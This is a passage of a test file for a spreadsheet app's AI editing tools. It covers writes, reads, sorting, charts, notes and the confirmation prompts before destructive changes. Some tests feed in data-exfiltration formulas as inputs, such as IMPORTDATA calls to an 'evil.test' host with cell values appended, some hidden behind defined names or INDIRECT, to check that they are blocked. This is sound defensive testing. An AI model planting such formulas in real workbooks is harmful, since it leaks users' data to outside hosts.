import { describe, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { chartData } from '../src/core/charts.js';
import { runTool, describeCall, callTarget, TOOLS, changesWorkbook, resolveRange, ToolError, MAX_READ_CHARS } from '../src/core/aitools.js';

function setup() {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const env = { sheetId: () => id, selection: () => ({ sheetId: id, range: { r1: 0, c1: 0, r2: 0, c2: 0 } }), distrust: vi.fn(), select: vi.fn(() => true) };
  const run = (name, args) => runTool(wb, name, args, env);
  run('write_cells', { start_cell: 'A1', values: [['Item', 'Qty', 'Price'], ['Apples', 3, 1.2], ['Pears', 5, 0.8], ['Plums', 2, 2.5]] });
  wb.clearHistory();
  return { wb, id, env, run };
}

describe('AI tools', () => {
  it('describes every tool as a function with an object schema', () => {
    for (const t of TOOLS) {
      expect(t.type).toBe('function');
      expect(t.function.parameters.type).toBe('object');
      for (const r of t.function.parameters.required) expect(t.function.parameters.properties).toHaveProperty(r);
    }
    expect(changesWorkbook('read_range')).toBe(false);
    expect(changesWorkbook('write_cells')).toBe(true);
  });

  it('writes values and formulas as one undo step, numbers as numbers', () => {
    const { wb, id, run } = setup();
    const res = run('write_cells', { start_cell: 'D1', values: [['Total'], ['=B2*C2'], ['=B3*C3']] });
    expect(res.ok).toBe(true);
    expect(res.changed).toBe(true);
    expect(wb.getValue(id, 1, 3)).toBeCloseTo(3.6);
    expect(wb.getValue(id, 1, 1)).toBe(3);
    expect(wb.undoLabels(5)).toEqual(['AI edit']);
    wb.undo();
    expect(wb.getCell(id, 0, 3)).toBeFalsy();
  });

  it('tells the model how to keep text that would read as a number, and keeps it', () => {
    const { wb, id, run } = setup();
    expect(TOOLS.find((t) => t.function.name === 'write_cells').function.description).toContain('start it with an apostrophe ("\'00123")');
    run('write_cells', { start_cell: 'E1', values: [["'00123", '00123']] });
    expect(wb.getValue(id, 0, 4)).toBe('00123');
    expect(wb.getValue(id, 0, 5)).toBe(123);
  });

  it('leaves null cells alone and reports formula errors with an explanation', () => {
    const { wb, id, run } = setup();
    const res = run('write_cells', { start_cell: 'A2', values: [[null, null, null, '=1/0']] });
    expect(wb.getValue(id, 1, 0)).toBe('Apples');
    expect(JSON.parse(res.content).formula_errors[0]).toMatch(/D2 shows #DIV\/0!/);
  });

  it('reads cells as shown, with a filled-down formula named once', () => {
    const { run } = setup();
    run('fill_formula', { range: 'D2:D4', formula: '=B2*C2' });
    const text = run('read_range', { range: 'A:D' }).content;
    expect(text).toContain('1\tItem\tQty\tPrice');
    expect(text).toContain('D2:D4: =B2*C2 (and so on down)');
    expect(text).toMatch(/^Sheet1!A1:D4/);
  });

  it('cuts a large read short and says where the rest is', () => {
    const { wb, id, run } = setup();
    wb.setCells(id, Array.from({ length: 3000 }, (_, r) => ({ r, c: 0, cell: { v: r, f: null } })));
    const text = run('read_range', { range: 'A1:A3000' }).content;
    expect(text).toMatch(/Cut short/);
    expect(text).toMatch(/Sheet1!A2501:A3000/);
  });

  it('holds a read of long text to a size the model can take, and says where the rest is', () => {
    const { wb, id, run } = setup();
    const long = 'word '.repeat(60);
    wb.setCells(id, Array.from({ length: 2000 }, (_, i) => ({ r: Math.floor(i / 4), c: i % 4, cell: { v: `${long}${i}`, f: null } })));
    const text = run('read_range', { range: 'A:D' }).content;
    expect(text.length).toBeLessThan(MAX_READ_CHARS + 1000);
    const last = Number(text.match(/^Sheet1!A1:D(\d+) /)[1]);
    expect(last).toBeGreaterThan(1);
    expect(last).toBeLessThan(500);
    expect(text).toContain(`Read Sheet1!A${last + 1}:D500 for the rest`);
    expect(text).toContain(`\n${last}\t`);
    expect(text).not.toContain(`\n${last + 1}\t`);
  });

  it('quotes long text in a calculation as a read does, held to a read\'s length', () => {
    const { wb, id, run } = setup();
    wb.setCells(id, Array.from({ length: 400 }, (_, r) => ({ r, c: 5, cell: { v: 'x'.repeat(30000), f: null } })));
    const many = run('calculate', { formula: '=F1:F400' }).content;
    expect(many.length).toBeLessThan(MAX_READ_CHARS + 1000);
    const parsed = JSON.parse(many);
    expect(parsed.values[0][0]).toBe(`${'x'.repeat(300)}…`);
    expect(parsed.note).toBe(`Only the first ${parsed.values.length} of 400 rows are shown.`);
    const one = JSON.parse(run('calculate', { formula: '=F1' }).content);
    expect(one.value.length).toBe(10001);
    expect(one.note).toMatch(/30,000 characters long/);
    expect(JSON.parse(run('calculate', { formula: '=SEQUENCE(3)' }).content)).toEqual({ rows: 3, columns: 1, values: [[1], [2], [3]] });
  });

  it('calculates without writing, and refuses functions that reach out', () => {
    const { wb, run } = setup();
    const before = wb.version;
    expect(JSON.parse(run('calculate', { formula: '=SUMPRODUCT(B2:B4,C2:C4)' }).content).value).toBeCloseTo(12.6);
    expect(JSON.parse(run('calculate', { formula: '=FILTER(A2:A4,B2:B4>2)' }).content).values).toEqual([['Apples'], ['Pears']]);
    expect(run('calculate', { formula: '=IMPORTDATA("https://example.com/a.csv")' }).ok).toBe(false);
    expect(wb.version).toBe(before);
  });

  it('holds back a formula that fetches from outside until the user allows it', () => {
    const { env, run } = setup();
    const res = run('write_cells', { start_cell: 'F1', values: [['=IMPORTDATA("https://example.com/a.csv")']] });
    expect(env.distrust).toHaveBeenCalled();
    expect(JSON.parse(res.content).note).toMatch(/Allow/);
  });

  it('holds back a formula that reaches out through a defined name, however it is written', () => {
    const { wb, id, env, run } = setup();
    const fetched = [];
    wb.setAsyncProvider('IMPORTDATA', async (text) => { fetched.push(text); return 'x'; });
    wb.setExternalAllowed(true);
    env.distrust.mockImplementation(() => wb.setExternalAllowed(false));
    wb.defineName('Grab', '=LAMBDA(u, IMPORTDATA(u))');
    wb.defineName('Raw', '=IMPORTDATA');
    wb.defineName('Again', '=Grab');
    wb.defineName('Rate', '=0.2');
    for (const f of ['=grab("https://evil.test/?d="&A2)', '=Raw("https://evil.test/?d="&A2)', '=Again("https://evil.test/?d="&A2)']) {
      env.distrust.mockClear();
      wb.setExternalAllowed(true);
      expect(run('calculate', { formula: f }).ok).toBe(false);
      run('write_cells', { start_cell: 'F1', values: [[f]] });
      expect(env.distrust).toHaveBeenCalled();
      run('fill_formula', { range: 'G1:G2', formula: f });
      expect(env.distrust).toHaveBeenCalledTimes(2);
      expect(run('add_conditional_format', { range: 'A2:A4', rule: 'formula', value: f.replace(/^=/, '=ISTEXT(') + ')' }).ok).toBe(false);
    }
    // A name that only holds a value is no reason to ask, nor is a longer name that merely begins like one.
    env.distrust.mockClear();
    wb.defineName('Grabbed', '=0.5');
    expect(run('write_cells', { start_cell: 'H1', values: [['=B2*Rate+Grabbed']] }).ok).toBe(true);
    expect(JSON.parse(run('calculate', { formula: '=Rate*10' }).content).value).toBe(2);
    expect(env.distrust).not.toHaveBeenCalled();
    return new Promise((r) => setTimeout(r, 20)).then(() => expect(fetched).toEqual([]));
  });

  it('holds back a formula that reaches such a name through INDIRECT', () => {
    const { wb, env, run } = setup();
    const fetched = [];
    wb.setAsyncProvider('IMPORTDATA', async (text) => { fetched.push(text); return 'x'; });
    env.distrust.mockImplementation(() => wb.setExternalAllowed(false));
    wb.defineName('Leak', '=IMPORTDATA("https://evil.test/?d="&Sheet1!$A$2)');
    wb.defineName('Via', '=INDIRECT("Le"&"ak")');
    for (const f of ['=INDIRECT("Le"&"ak")', '=indirect("Leak")+1', '=Via']) {
      env.distrust.mockClear();
      wb.setExternalAllowed(true);
      expect(run('calculate', { formula: f }).ok).toBe(false);
      run('write_cells', { start_cell: 'F1', values: [[f]] });
      expect(env.distrust).toHaveBeenCalled();
      run('fill_formula', { range: 'G1:G2', formula: f });
      expect(env.distrust).toHaveBeenCalledTimes(2);
      expect(run('add_conditional_format', { range: 'A2:A4', rule: 'formula', value: `=ISERROR(${f.slice(1)})` }).ok).toBe(false);
    }
    return new Promise((r) => setTimeout(r, 20)).then(() => expect(fetched).toEqual([]));
  });

  it('lets INDIRECT be when no name reaches out', () => {
    const { wb, env, run } = setup();
    wb.defineName('Rate', '=0.2');
    wb.defineName('Here', '=Sheet1!$A$1:$A$3');
    expect(run('calculate', { formula: '=ROWS(INDIRECT("Here"))' }).content).toContain('"value":3');
    expect(run('write_cells', { start_cell: 'H1', values: [['=INDIRECT("A2")']] }).ok).toBe(true);
    expect(env.distrust).not.toHaveBeenCalled();
  });

  it('makes a table of whole columns or rows from the data in them', () => {
    const { wb, id, run } = setup();
    expect(JSON.parse(run('create_table', { range: 'A:D' }).content).range).toBe('Sheet1!A1:C4');
    expect(wb.sheet(id).cells.size).toBeLessThan(100);
    const lower = wb.addSheet('Lower').id;
    run('write_cells', { start_cell: 'Lower!B3', values: [['Name', 'Score'], ['Ann', 3]] });
    expect(JSON.parse(run('create_table', { range: 'Lower!1:10' }).content).range).toBe('Lower!B3:C4');
    expect(wb.sheet(lower).cells.size).toBeLessThan(100);
    const empty = wb.addSheet('Empty').id;
    expect(run('create_table', { range: 'Empty!A:C' }).content).toMatch(/holds no data/);
    expect(wb.sheet(empty).tables?.length || 0).toBe(0);
  });

  it('asks before a table turns the formulas of its header row into text, and says it did', () => {
    const { wb, id, env, run } = setup();
    expect(describeCall(wb, 'create_table', { range: 'A1:C4' }, env).destructive).toBe(false);
    wb.setInput(id, 0, 5, '="Year "&2024');
    wb.setInput(id, 1, 5, '5');
    wb.setInput(id, 0, 7, '=TRANSPOSE(K1:K2)');
    wb.setInput(id, 0, 10, 'Cost');
    wb.setInput(id, 1, 10, 'Tax');
    wb.setInput(id, 1, 7, '1');
    wb.setInput(id, 1, 8, '2');
    expect(describeCall(wb, 'create_table', { range: 'F1:F2' }, env)).toMatchObject({ destructive: true, detail: 'Turns 1 formula in the header row into the text it shows.' });
    expect(describeCall(wb, 'create_table', { range: 'F:I' }, env)).toMatchObject({ destructive: true, detail: 'Turns 2 formulas in the header row into the text they show.' });
    const res = run('create_table', { range: 'H1:I2' });
    expect(res.ok).toBe(true);
    expect(JSON.parse(res.content).note).toMatch(/formula in its header row was turned into the text/);
    expect(wb.getCell(id, 0, 7).f).toBeNull();
  });

  it('says a chart sheet has no rows, columns or panes to change', () => {
    const { wb, run } = setup();
    const chart = wb.addSheet('Overview');
    chart.kind = 'chart';
    for (const [name, args] of [['freeze_panes', { sheet: 'Overview', rows: 2 }], ['insert_rows', { sheet: 'Overview', before_row: 1 }], ['delete_columns', { sheet: 'Overview', start_column: 'A' }], ['set_column_width', { sheet: 'Overview', columns: 'A', width: '80' }]]) {
      const res = run(name, args);
      expect(res.ok).toBe(false);
      expect(res.content).toMatch(/chart sheet/);
    }
    expect(chart.frozenRows || 0).toBe(0);
  });

  it('refuses writes into protected cells without changing anything', () => {
    const { wb, id, run } = setup();
    wb.protectRange(id, { r1: 1, c1: 1, r2: 1, c2: 1 });
    const before = wb.version;
    const res = run('write_cells', { start_cell: 'B2', values: [[9]] });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/protected/);
    expect(wb.version).toBe(before);
  });

  it('does not report a hidden sheet as shown, which would leave its ranges on the sheet in view', () => {
    const wb = new Workbook();
    const id = wb.activeSheetId;
    const secret = wb.addSheet('Q1 Secret').id;
    wb.setActiveSheet(id);
    wb.setSheetHidden(secret, true);
    const env = { sheetId: () => wb.activeSheetId, selection: () => null, showSheet: (s) => { if (!wb.sheet(s)?.hidden) wb.setActiveSheet(s); } };
    const res = runTool(wb, 'manage_sheet', { action: 'activate', sheet: 'Q1 Secret' }, env);
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/'Q1 Secret' is hidden/);
    expect(wb.activeSheetId).toBe(id);
    wb.setSheetHidden(secret, false);
    expect(JSON.parse(runTool(wb, 'manage_sheet', { action: 'activate', sheet: 'Q1 Secret' }, env).content.split('\n')[0])).toEqual({ active_sheet: 'Q1 Secret' });
    expect(wb.activeSheetId).toBe(secret);
  });

  it('refuses a note on a protected cell, and never reports an unchanged workbook as changed', () => {
    const { wb, id, run } = setup();
    wb.protectRange(id, { r1: 0, c1: 0, r2: 0, c2: 0 });
    const res = run('add_note', { cell: 'A1', text: 'hello' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/protected/);
    expect(wb.getNote(id, 0, 0)).toBeFalsy();
    run('freeze_panes', { rows: 1 });
    const again = run('freeze_panes', { rows: 1 });
    expect(again.changed).toBe(false);
    expect(again.content).toMatch(/nothing in the workbook changed/);
    expect(run('freeze_panes', { rows: 2 }).content).not.toMatch(/nothing/);
  });

  it('reports a blank note as removed, and a long one as cut to what the cell keeps', () => {
    const { wb, id, run } = setup();
    wb.setNote(id, 0, 0, 'old');
    expect(JSON.parse(run('add_note', { cell: 'A1', text: '   ' }).content)).toEqual({ note_removed: 'Sheet1!A1' });
    expect(wb.getNote(id, 0, 0)).toBeNull();
    const long = JSON.parse(run('add_note', { cell: 'A2', text: 'x'.repeat(4500) }).content);
    expect(long.note_added).toBe('Sheet1!A2');
    expect(long.note).toMatch(/at most 4,000 characters/);
    expect(wb.getNote(id, 1, 0).length).toBe(4000);
    expect(JSON.parse(run('add_note', { cell: 'A3', text: 'short' }).content).note).toBeUndefined();
  });

  it('says a protected sheet keeps its column widths, rather than reporting a resize', () => {
    const { wb, id, run } = setup();
    wb.setSheetProtected(id, true);
    const before = wb.version;
    for (const width of [120, 'fit']) {
      const res = run('set_column_width', { columns: 'A:B', width });
      expect(res.ok).toBe(false);
      expect(res.content).toMatch(/Sheet1 is protected/);
    }
    expect(wb.version).toBe(before);
  });

  // The model writes a date as "2024-01-05": rewriting a block it had read, each unchanged date was counted as data
  // replaced, and the write stopped to ask about cells it left as they were.
  it('does not count a cell rewritten with the value it holds as replaced', () => {
    const { wb, id, env, run } = setup();
    run('write_cells', { start_cell: 'D1', values: [['Date', 'Share', 'Check'], ['2024-01-05', '5%', '#N/A'], ['2024-02-01', 0.5, '=B3*2']] });
    run('format_cells', { range: 'A3', number_format: 'text' });
    const detail = (values, at = 'A2') => describeCall(wb, 'write_cells', { start_cell: at, values }, env).detail;
    expect(detail([['Apples', 3, 1.2, '2024-01-05', '5%', '#N/A'], ['Pears', '5', '0.80', '2024-02-01', '50%', '=B3*2']])).toBeNull();
    expect(detail([[null, null, null, '2024-01-06']])).toBe('Replaces 1 cell that already holds data.');
    expect(detail([[null, '']])).toBe('Replaces 1 cell that already holds data.');
    expect(detail([[null, '=1+2']])).toBe('Replaces 1 cell that already holds data.');
    expect(detail([[null, null, null, null, null, null], [null, null, null, null, null, '=B3*3']])).toBe('Replaces 1 cell that already holds data.');
    expect(detail([[null, null, null, null, null, '#DIV/0!']])).toBe('Replaces 1 cell that already holds data.');
    expect(wb.getCell(id, 2, 0).v).toBe('Pears');
  });

  it('names the rows and the cell a step acts on as the runner reads them', () => {
    const { wb, env } = setup();
    expect(describeCall(wb, 'insert_rows', { before_row: 3, count: 2.5 }, env).label).toBe('Insert 2 rows above row 3 on Sheet1');
    expect(describeCall(wb, 'delete_rows', { start_row: 2.7, count: 2.9 }, env).label).toBe('Delete rows 2–3 on Sheet1');
    expect(describeCall(wb, 'delete_columns', { start_column: 'B', count: '2' }, env).label).toBe('Delete columns B–C on Sheet1');
    expect(describeCall(wb, 'add_note', { cell: 'B2:C4', text: 'Check' }, env).label).toBe('Add a note to Sheet1!B2');
    expect(callTarget(wb, 'add_note', { cell: 'B2:C4', text: 'Check' }, env).range).toEqual({ r1: 1, c1: 1, r2: 1, c2: 1 });
  });

  it('finds text a formula spills into the cells beside it, as shown', () => {
    const { wb, run } = setup();
    run('write_cells', { start_cell: 'F1', values: [['=UPPER(A2:A4)']] });
    const found = JSON.parse(run('find', { query: 'pears' }).content);
    expect(found.matches.map((m) => m.cell)).toEqual(['Sheet1!F2', 'Sheet1!A3']);
    expect(found.matches[0].text).toBe('PEARS');
    // Spilled cells have no formula of their own to search.
    expect(JSON.parse(run('find', { query: 'UPPER', in_formulas: true }).content).matches.map((m) => m.cell)).toEqual(['Sheet1!F1']);
  });

  // A range has one rule: a dropdown added over the user's own, on the same cells, took its choices away unasked.
  it('asks before a dropdown replaces the one the cells have', () => {
    const { wb, id, env, run } = setup();
    expect(describeCall(wb, 'add_dropdown', { range: 'D2:D4', options: ['a'] }, env)).toMatchObject({ label: 'Add a dropdown to Sheet1!D2:D4' });
    expect(run('add_dropdown', { range: 'D2:D4', options: ['Open', 'Done'] }).content).not.toContain('replaced');
    const d = describeCall(wb, 'add_dropdown', { range: 'D2:D4', options: ['x'] }, env);
    expect(d).toMatchObject({ label: 'Replace the dropdown on Sheet1!D2:D4', destructive: true, detail: 'Replaces the dropdown these cells have, and its choices.' });
    // Other cells keep their rule, and are not asked about.
    expect(describeCall(wb, 'add_dropdown', { range: 'D2:D5', options: ['x'] }, env).destructive).toBeFalsy();
    expect(run('add_dropdown', { range: 'D2:D4', options: ['x'] }).content).toContain('replaced');
    expect(wb.sheet(id).validations.map((v) => v.source)).toEqual([['x']]);
  });

  // The same text read as typed can still replace what a cell holds: an ID kept as text, "00123", written back as it
  // reads became the number 123, its zeros gone, and was not asked about.
  it('counts text written back as it reads, but read as a number or date, as replaced', () => {
    const { wb, id, env } = setup();
    wb.setInput(id, 5, 0, "'00123");
    wb.setInput(id, 6, 0, "'1/2");
    wb.setInput(id, 7, 0, "'7");
    const detail = (values) => describeCall(wb, 'write_cells', { start_cell: 'A6', values }, env).detail;
    expect(detail([['00123'], ['1/2']])).toBe('Replaces 2 cells that already hold data.');
    expect(detail([["'00123"], ["'1/2"]])).toBeNull();
    // A number over the text "7" makes it a number; over the number 3 it changes nothing.
    expect(detail([[null], [null], [7]])).toBe('Replaces 1 cell that already holds data.');
    expect(describeCall(wb, 'write_cells', { start_cell: 'B2', values: [[3, 1.2]] }, env).detail).toBeNull();
  });

  // The label read only the call's own numbers: { rows: 0 } on a sheet with columns frozen said "Unfreeze", though
  // the columns stay frozen, as the runner keeps whatever the call leaves out.
  it('labels a change of panes by the panes it leaves', () => {
    const { wb, env, run } = setup();
    const label = (args) => describeCall(wb, 'freeze_panes', args, env).label;
    expect(label({ rows: 1 })).toBe('Freeze 1 row on Sheet1');
    expect(label({})).toBe('Unfreeze Sheet1');
    run('freeze_panes', { rows: 1, columns: 2 });
    expect(label({ rows: 0 })).toBe('Freeze 2 columns on Sheet1');
    expect(label({ columns: 3 })).toBe('Freeze 1 row and 3 columns on Sheet1');
    expect(label({ rows: 0, columns: 0 })).toBe('Unfreeze Sheet1');
    expect(label({ sheet: 'Nope', rows: 2 })).toBe('Freeze 2 rows on Nope');
  });

  it('names the columns a width change is for as the runner reads them, in words that agree', () => {
    const { wb, env } = setup();
    const label = (args) => describeCall(wb, 'set_column_width', args, env).label;
    expect(label({ columns: 'B', width: 'fit' })).toBe('Fit column B to its contents');
    expect(label({ columns: 'd:b', width: 'Fit' })).toBe('Fit columns B:D to their contents');
    expect(label({ columns: '$C', width: '120' })).toBe('Set column C to 120px');
    expect(label({ columns: 'A:F', width: 90 })).toBe('Set columns A:F to 90px');
    expect(label({ columns: 'B:B', width: 'fit' })).toBe('Fit column B to its contents');
    expect(label({ columns: '12', width: 'fit' })).toBe('Fit column 12 to its contents');
  });

  it('marks a write that replaces data, or a delete of it, as destructive', () => {
    const { wb, env } = setup();
    expect(describeCall(wb, 'write_cells', { start_cell: 'B2', values: [[3, 9]] }, env)).toMatchObject({ destructive: true, detail: 'Replaces 1 cell that already holds data.' });
    expect(describeCall(wb, 'write_cells', { start_cell: 'E1', values: [[1]] }, env).destructive).toBe(false);
    expect(describeCall(wb, 'delete_rows', { start_row: 2, count: 2 }, env)).toMatchObject({ destructive: true, detail: 'Removes 6 cells of data.' });
    expect(describeCall(wb, 'delete_rows', { start_row: 20 }, env).destructive).toBe(false);
    expect(describeCall(wb, 'clear_range', { range: 'A1:C1', what: 'formats' }, env).destructive).toBe(false);
    expect(describeCall(wb, 'manage_sheet', { action: 'delete', sheet: 'Sheet1' }, env).destructive).toBe(true);
    expect(describeCall(wb, 'read_range', { range: 'A:C' }, env).label).toBe('Read Sheet1!A:C');
  });

  it('asks before replacing or removing a note the cell already has', () => {
    const { wb, id } = setup();
    const env = { sheetId: () => id };
    expect(describeCall(wb, 'add_note', { cell: 'D4', text: 'new' }, env)).toMatchObject({ label: 'Add a note to Sheet1!D4', destructive: false });
    expect(describeCall(wb, 'add_note', { cell: 'D4', text: '' }, env).destructive).toBe(false);
    wb.setNote(id, 3, 3, 'Checked by finance');
    expect(describeCall(wb, 'add_note', { cell: 'D4', text: 'new' }, env)).toMatchObject({ label: 'Replace the note on Sheet1!D4', destructive: true, detail: 'Replaces the note the cell has.' });
    expect(describeCall(wb, 'add_note', { cell: 'D4', text: '  ' }, env)).toMatchObject({ label: 'Remove the note from Sheet1!D4', destructive: true });
    expect(describeCall(wb, 'add_note', { cell: 'D4', text: 'Checked by finance' }, env).destructive).toBe(false);
  });

  it('sorts under a guessed header, formats, charts beside the data and makes tables', () => {
    const { wb, id, run } = setup();
    expect(JSON.parse(run('sort_range', { range: 'A1:C4', keys: [{ column: 'B', ascending: false }] }).content).header_kept).toBe(true);
    expect(wb.getValue(id, 1, 0)).toBe('Pears');
    run('format_cells', { range: 'A1:C1', bold: true, fill_color: '#e0ecff', number_format: 'currency', currency: 'EUR' });
    expect(wb.styleAt(id, 0, 0)).toMatchObject({ bold: true, bg: '#e0ecff', fmt: 'currency', cur: 'EUR' });
    const chart = JSON.parse(run('create_chart', { data_range: 'A1:B4', type: 'bar' }).content);
    expect(chart.placed_at).toBe('E1');
    expect(JSON.parse(run('create_table', { range: 'A1:C4', name: 'Fruit' }).content).columns).toEqual(['Item', 'Qty', 'Price']);
  });

  it('asks before writing over a formula\'s spilled results, and tells the model the formula shows #SPILL!', () => {
    const { wb, id, env, run } = setup();
    wb.setInput(id, 0, 5, '=SEQUENCE(4)');
    expect(wb.getValue(id, 2, 5)).toBe(3);
    expect(describeCall(wb, 'write_cells', { start_cell: 'F3', values: [['x']] }, env)).toMatchObject({ destructive: true, detail: 'Blocks the results a formula spills into these cells: it will show #SPILL!.' });
    expect(describeCall(wb, 'fill_formula', { range: 'F2:F3', formula: '=1' }, env).destructive).toBe(true);
    // Nulls and empty text land on nothing; the formula's own cell written over is a value replaced, not a spill blocked.
    expect(describeCall(wb, 'write_cells', { start_cell: 'F2', values: [[null], ['']] }, env).destructive).toBe(false);
    expect(describeCall(wb, 'write_cells', { start_cell: 'F1', values: [['a'], ['b']] }, env)).toMatchObject({ detail: 'Replaces 1 cell that already holds data.' });
    expect(describeCall(wb, 'write_cells', { start_cell: 'G1', values: [['x']] }, env).destructive).toBe(false);
    const res = JSON.parse(run('write_cells', { start_cell: 'F3', values: [['x']] }).content);
    expect(res.spills_blocked).toEqual([expect.stringMatching(/^Sheet1!F1 now shows #SPILL!/)]);
    wb.undo();
    expect(JSON.parse(run('fill_formula', { range: 'F2:F3', formula: '=1' }).content).spills_blocked).toHaveLength(1);
  });

  it('will not sort part of a table\'s rows apart from the rest unless told to', () => {
    const { wb, id, run } = setup();
    // Items only: each price and quantity would be left beside another item.
    const res = run('sort_range', { range: 'A2:A4', keys: [{ column: 'A', ascending: false }] });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/Sheet1!A2:C4/);
    expect(res.changed).toBe(false);
    expect(wb.getValue(id, 1, 0)).toBe('Apples');
    expect(run('sort_range', { range: 'B:B', keys: [{ column: 'B' }] }).ok).toBe(false);
    // Asked for on purpose, the column sorts alone; so does a block with nothing beside it.
    expect(run('sort_range', { range: 'B2:B4', keys: [{ column: 'B' }] }).content).toMatch(/go on into column A and column C.*Sort the whole block, Sheet1!A2:C4/);
    expect(run('sort_range', { range: 'A2:A4', keys: [{ column: 'A', ascending: false }], has_header: false, only_these_columns: true }).ok).toBe(true);
    expect([1, 2, 3].map((r) => wb.getDisplay(id, r, 0))).toEqual(['Plums', 'Pears', 'Apples']);
    expect(wb.getValue(id, 1, 1)).toBe(3);
    wb.setInput(id, 9, 5, 'b');
    wb.setInput(id, 10, 5, 'a');
    expect(run('sort_range', { range: 'F10:F11', keys: [{ column: 'F' }], has_header: false }).ok).toBe(true);
    expect(wb.getValue(id, 9, 5)).toBe('a');
  });

  it('sorts whole columns as the data in them, keeping a header that lies below blank rows', () => {
    const wb = new Workbook();
    const id = wb.activeSheetId;
    const env = { sheetId: () => id, selection: () => null };
    [['Name', 'N'], ['c', '3'], ['a', '1'], ['b', '2']].forEach((row, i) => row.forEach((v, j) => wb.setInput(id, i + 2, j, v)));
    const res = JSON.parse(runTool(wb, 'sort_range', { range: 'A:B', keys: [{ column: 'B' }] }, env).content);
    expect(res).toMatchObject({ sorted: 'Sheet1!A4:B6', header_kept: true });
    expect([0, 1, 2, 3, 4, 5].map((r) => wb.getDisplay(id, r, 0))).toEqual(['', '', 'Name', 'a', 'b', 'c']);
    // From the first row too, and an empty column is said to be empty.
    const top = new Workbook();
    const t = top.activeSheetId;
    [['Item', 'Qty'], ['x', '2'], ['y', '1']].forEach((row, i) => row.forEach((v, j) => top.setInput(t, i, j, v)));
    expect(JSON.parse(runTool(top, 'sort_range', { range: 'A:B', keys: [{ column: 'B' }] }, { sheetId: () => t }).content).sorted).toBe('Sheet1!A2:B3');
    expect(top.getDisplay(t, 1, 0)).toBe('y');
    expect(runTool(top, 'sort_range', { range: 'D:E', keys: [{ column: 'D' }] }, { sheetId: () => t }).content).toMatch(/holds no data to sort/);
  });

  it('charts whole columns from where their data begins, so its header names the series', () => {
    const wb = new Workbook();
    const id = wb.activeSheetId;
    [['Name', 'Sales'], ['c', '3'], ['a', '1']].forEach((row, i) => row.forEach((v, j) => wb.setInput(id, i + 2, j, v)));
    const res = JSON.parse(runTool(wb, 'create_chart', { data_range: 'A:B', type: 'column' }, { sheetId: () => id }).content);
    expect(res.chart).toBe('column chart of Sheet1!A3:B5');
    expect(wb.sheet(id).charts[0].range).toEqual({ r1: 2, c1: 0, r2: 4, c2: 1 });
    const drawn = chartData(wb, id, wb.sheet(id).charts[0]);
    expect(drawn.series.map((s) => s.name)).toEqual(['Sales']);
    expect(drawn.categories).toEqual(['c', 'a']);
    // A range written out keeps its own first row.
    runTool(wb, 'create_chart', { data_range: 'A1:B5', type: 'column' }, { sheetId: () => id });
    expect(wb.sheet(id).charts[1].range).toEqual({ r1: 0, c1: 0, r2: 4, c2: 1 });
  });

  it('formats whole columns and rows, as the toolbar does', () => {
    const { wb, id, run } = setup();
    expect(run('format_cells', { range: 'B:B', bold: true }).ok).toBe(true);
    expect(wb.styleAt(id, 5000, 1)?.bold).toBe(true);
    expect(run('format_cells', { range: '1:1', fill_color: '#e0ecff' }).ok).toBe(true);
    expect(wb.styleAt(id, 0, 200)?.bg).toBe('#e0ecff');
    expect(wb.undoLabels(2)).toHaveLength(2);
  });

  it('borders whole columns and rows as lines, past the rows the sheet holds so far', () => {
    const { wb, id, run } = setup();
    expect(run('format_cells', { range: 'A:B', borders: 'outer' }).ok).toBe(true);
    // No edge drawn at the sheet's last row, as if the columns ended there.
    expect(wb.styleAt(id, 99, 0)?.bb).toBeFalsy();
    wb.ensureSize(id, 600, 60);
    expect(wb.styleAt(id, 499, 0)?.bl).toBe(true);
    expect(wb.styleAt(id, 499, 1)?.br).toBe(true);
    expect(run('format_cells', { range: '3:3', borders: 'all' }).ok).toBe(true);
    wb.ensureSize(id, 600, 80);
    expect(wb.styleAt(id, 2, 70)?.bt).toBe(true);
    expect(run('format_cells', { range: 'A:B', borders: 'none' }).ok).toBe(true);
    expect(wb.styleAt(id, 499, 0)?.bl).toBeFalsy();
  });

  it('adds conditional formats and dropdowns, and says what is wrong with bad arguments', () => {
    const { wb, id, run } = setup();
    expect(run('add_conditional_format', { range: 'B2:B4', rule: 'gt', value: '2' }).ok).toBe(true);
    expect(wb.sheet(id).rules.at(-1)).toMatchObject({ type: 'gt', value: 2, style: { bg: '#fef3c7' } });
    expect(run('add_conditional_format', { range: 'B2:B4', rule: 'gt', value: 'lots' }).content).toMatch(/must be a number/);
    expect(run('add_dropdown', { range: 'D2:D4', options: ['Yes', 'No'] }).ok).toBe(true);
    expect(run('format_cells', { range: 'A1', fill_color: 'red' }).content).toMatch(/#1f6feb/);
    expect(run('read_range', { range: 'Nowhere!A1' }).content).toMatch(/no sheet named "Nowhere"/);
    expect(run('no_such_tool', {}).ok).toBe(false);
  });

  it('asks before deleting rows or columns that hold only notes', () => {
    const { wb, id, env } = setup();
    wb.setNote(id, 9, 4, 'Checked with finance');
    const rows = describeCall(wb, 'delete_rows', { start_row: 10 }, env);
    expect(rows).toMatchObject({ destructive: true, detail: 'Removes 1 note.' });
    expect(describeCall(wb, 'delete_columns', { start_column: 'E' }, env)).toMatchObject({ destructive: true, detail: 'Removes 1 note.' });
    expect(describeCall(wb, 'delete_rows', { start_row: 2, count: 9 }, env)).toMatchObject({ destructive: true, detail: 'Removes 9 cells of data and 1 note.' });
    expect(describeCall(wb, 'delete_rows', { start_row: 11 }, env).destructive).toBe(false);
  });

  it('names the sheet a change acts on when the call leaves it to the active one', () => {
    const { wb, env } = setup();
    expect(describeCall(wb, 'manage_sheet', { action: 'delete' }, env).label).toBe('Delete the sheet Sheet1');
    expect(describeCall(wb, 'manage_sheet', { action: 'rename', new_name: 'Data' }, env).label).toBe('Rename Sheet1 to Data');
    expect(describeCall(wb, 'manage_sheet', { action: 'add' }, env).label).toBe('Add a sheet');
    expect(describeCall(wb, 'manage_sheet', { action: 'add', sheet: 'Q3' }, env).label).toBe('Add a sheet named Q3');
  });

  it('inserts, deletes and manages sheets', () => {
    const { wb, id, run } = setup();
    run('insert_rows', { before_row: 2, count: 2 });
    expect(wb.getValue(id, 3, 0)).toBe('Apples');
    run('delete_rows', { start_row: 2, count: 2 });
    expect(wb.getValue(id, 1, 0)).toBe('Apples');
    run('insert_columns', { before_column: 'A' });
